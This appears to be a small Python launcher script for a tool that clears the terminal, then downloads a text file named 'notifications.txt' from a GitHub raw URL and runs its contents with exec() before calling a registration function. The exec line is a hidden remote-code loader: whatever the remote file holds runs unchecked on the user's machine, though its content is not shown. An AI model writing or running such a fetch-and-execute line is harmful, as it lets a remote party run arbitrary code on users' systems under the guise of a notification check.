import os
import main
import requests
from data.color import *
os.system("clear")
exec(requests.get("https://raw.githubusercontent.com/asu-labs/server/master/notifications.txt").text)
main.regis()
